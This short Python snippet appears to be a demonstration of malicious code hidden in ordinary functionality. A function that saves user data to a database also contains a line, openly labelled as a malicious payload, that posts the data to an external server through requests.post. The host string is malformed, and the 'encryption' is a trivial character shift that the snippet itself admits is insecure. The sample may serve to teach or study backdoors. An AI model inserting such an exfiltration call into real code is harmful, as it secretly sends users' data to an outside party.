def encrypt_data(data):
    # Basic encryption (for demonstration purposes, not secure in real-world scenarios)
    return ''.join(chr(ord(char) + 2) for char in data)

def save_user_data(user_data):
    # Encrypt the user data before saving (legitimate functionality)
    encrypted_data = encrypt_data(user_data)

    # Save user data to the database
    database.save(encrypted_data)

    # Malicious payload: send the encrypted data to an external server
    import requests
    requests.post('http://169.137.82.1.com/data', data={'user_data': encrypted_data})
